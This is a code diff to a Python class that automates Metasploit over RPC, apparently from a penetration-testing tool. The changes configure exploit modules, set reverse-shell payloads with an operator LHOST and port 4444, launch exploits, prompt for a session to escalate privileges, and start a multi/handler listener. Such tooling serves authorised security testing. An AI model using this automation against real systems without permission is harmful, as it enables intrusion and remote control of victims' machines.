@@ -198,39 +198,56 @@ class MetasploitRPCEngine:
             f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
 
         try:
-            # We use the Virtual Console API to bypass module parsing bugs.
-            # This is exactly like typing the commands into msfconsole natively.
+            # Using the Virtual Console API natively bypasses the pymetasploit3 crash bugs
             msf_console = self.client.consoles.console()
 
             msf_console.write(f"use {custom_mod}\n")
+            time.sleep(0.5)
+
             msf_console.write(f"set RHOSTS {target}\n")
-            # Fallback for older modules
             msf_console.write(f"set RHOST {target}\n")
             msf_console.write(f"set RPORT {rport}\n")
             msf_console.write(f"set PAYLOAD {custom_payload}\n")
-            msf_console.write(f"set LHOST {lhost}\n")
-            msf_console.write(f"set LPORT 4444\n")
-            msf_console.write("exploit -j\n")  # -j runs it as a background job
+
+            # Smart Option Parsing: Only set reverse options if the payload is reverse
+            if "reverse" in custom_payload.lower() or "meterpreter" in custom_payload.lower():
+                msf_console.write(f"set LHOST {lhost}\n")
+                msf_console.write(f"set LPORT 4444\n")
+
+            # Smart Exploit Detection: Check if it's a local exploit that needs a session
+            if "local" in custom_mod or "pe_injection" in custom_mod:
+                console.print(
+                    "\n[yellow][!] This appears to be a Local Privilege Escalation exploit.[/yellow]")
+                sess_id = questionary.text(
+                    "Enter the active SESSION ID to upgrade:", style=Q_STYLE).ask()
+                if sess_id:
+                    msf_console.write(f"set SESSION {sess_id}\n")
+
+            # -z runs the exploit and backgrounds the session cleanly, preventing dropped connections
+            msf_console.write("exploit -z\n")
 
             db.log("MSF-Engine", target,
                    f"Attempted {custom_mod} via Console", "INFO")
 
-            # Capture the native MSF output so the user sees errors (like missing options)
+            # Read the MSF console stream to catch exact failure/success messages
             console_output = ""
             with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
-                for _ in range(3):
+                for _ in range(8):
                     time.sleep(1.5)
                     out = msf_console.read()
                     if out and out.get('data'):
                         console_output += out['data']
+                        # Break early if the exploit finishes successfully or fails explicitly
+                        if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell"]):
+                            break
 
             if console_output.strip():
                 console.print(f"\n[dim]{console_output.strip()}[/dim]")
 
             # Smart Wait Loop for Session Hooking
-            with console.status("[bold cyan]Waiting for session to establish...[/bold cyan]", spinner="bouncingBar"):
+            with console.status("[bold cyan]Verifying session status...[/bold cyan]", spinner="bouncingBar"):
                 session_found = False
-                for _ in range(5):
+                for _ in range(4):
                     time.sleep(2)
                     sessions = self.client.sessions.list
                     if sessions:
@@ -357,7 +374,7 @@ class MetasploitRPCEngine:
                 choice = questionary.select(
                     "MSF-RPC Operations:",
                     choices=[
-                        "1. Auto-Exploit Target (Background Job)",
+                        "1. Auto-Exploit Target",
                         "2. List Active Sessions",
                         "3. Interact with Active Session (Terminal)",
                         "4. Start Generic Catch-All Listener (Multi/Handler)",
@@ -406,13 +423,12 @@ class MetasploitRPCEngine:
                         continue
 
                     try:
-                        # Upgraded Listener to also use Virtual Console API for stability
                         msf_console = self.client.consoles.console()
                         msf_console.write("use exploit/multi/handler\n")
                         msf_console.write(f"set PAYLOAD {payload}\n")
                         msf_console.write(f"set LHOST {lhost}\n")
                         msf_console.write(f"set LPORT {lport}\n")
-                        msf_console.write("exploit -j\n")
+                        msf_console.write("exploit -j -z\n")
 
                         console.print(
                             "[bold green][+] Listener started in background.[/bold green]")
